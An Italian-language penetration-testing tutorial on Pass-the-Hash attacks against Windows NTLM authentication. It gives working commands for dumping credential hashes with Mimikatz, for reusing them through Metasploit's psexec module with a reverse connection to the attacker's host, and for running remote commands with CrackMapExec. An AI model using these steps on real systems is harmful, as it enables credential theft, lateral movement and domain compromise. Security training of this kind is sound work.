# Pass The Hash Attack

Il Pass-the-Hash (PtH) è una tecnica che consente di autenticarsi su un sistema remoto senza conoscere la password in chiaro, utilizzando direttamente l’hash NTLM dell’utente. <br>
È un metodo estremamente potente nel contesto del penetration testing perché **bypassa la necessità di conoscere la password vera e propria**, e permette comunque di accedere a servizi remoti che accettano l’autenticazione NTLM (come SMB o WinRM).

Esistono due tipi di HASH:
- **LM (LAN Manager)**: algoritmo obsoleto, case-insensitive (le lettere maiuscole/minuscole sono trattate allo stesso modo), divide le password in due blocchi da 7 caratteri e li cifra con DES. È estremamente debole e vulnerabile a bruteforce.
- **NTLM (NT LAN Manager)**: introdotto con Windows NT, usa un algoritmo basato su MD4, case-sensitive (distingue lettere maiuscole e minuscole), ed è molto più sicuro rispetto a LM, anche se non è salato, quindi vulnerabile a rainbow tables.

In ambienti moderni, **LM è disabilitato per default**, ma NTLM continua ad essere supportato, soprattutto per compatibilità legacy.

La capacità di catturare un hash NTLM è quindi fondamentale: esso rappresenta la “firma” digitale della password, e può essere utilizzato per ottenere l’accesso a risorse di rete, spostarsi lateralmente all'interno dell'infrastruttura e perfino compromettere interi domini Active Directory. <br>
A differenza delle password in chiaro, **gli hash NTLM spesso non vengono ruotati regolarmente** e, una volta ottenuti, **rimangono validi per lunghi periodi**, specialmente se associati ad account amministrativi.

## 1 – Raccolta degli hash con Mimikatz

Dopo aver ottenuto accesso a una macchina target con privilegi elevati, si può eseguire:

`load kiwi` carica l'estensione kiwi <br>
`lsa_dump_sam ` estrae hash SAM + SysKey <br>
`hashdump` dump degli hash NTLM/LM degli utenti <br>

Salviamo gli hash in un file locale, per esempio `hashes.txt`, in modo da poterli riutilizzare nei passaggi successivi.

---

## 2 – Utilizzo dell’hash con Metasploit (PsExec)

`psexec` è un modulo exploit SMB che consente di autenticarsi tramite hash NTLM:

`use exploit/windows/smb/psexec` carica il modulo psexec <br>
`set RHOST <IP>` IP della macchina target <br>
`set SMBUser Administrator` utente con hash disponibile <br>
`set SMBPass <NTLMHash>`# hash dell'utente <br>
`set LHOST <KaliIP>` IP della macchina di attacco <br>
`set LPORT <PortDiversa>` porta diversa da quella già in uso <br>
`set target Native upload` forza l'upload via SMB (default più compatibile) <br>
`run` <br>

### Perché usare `target Native upload`?
Questo target è pensato per caricare manualmente il payload via SMB anziché usare metodi alternativi (come Powershell o VBScript) che possono essere bloccati dalle policy. È spesso il metodo più compatibile in ambienti legacy.

---

## 3 – Uso di CrackMapExec

**CrackMapExec** è un potente tool per testare la sicurezza dei protocolli SMB, WinRM, RDP e altri. Supporta l'autenticazione Pass-the-Hash:

`crackmapexec smb <IP> -u Administrator -H "<NTLMHash>"  # autentica con hash`

Se l'autenticazione ha successo, verrà visualizzato:
```
SMB         <IP>    445    Pwn3d!
```

Possiamo quindi eseguire comandi remoti con:

`crackmapexec smb <IP> -u Administrator -H "<NTLMHash>" -x "ipconfig"`

Questo comando eseguirà `ipconfig` sulla macchina bersaglio e restituirà l'output direttamente a schermo.

---
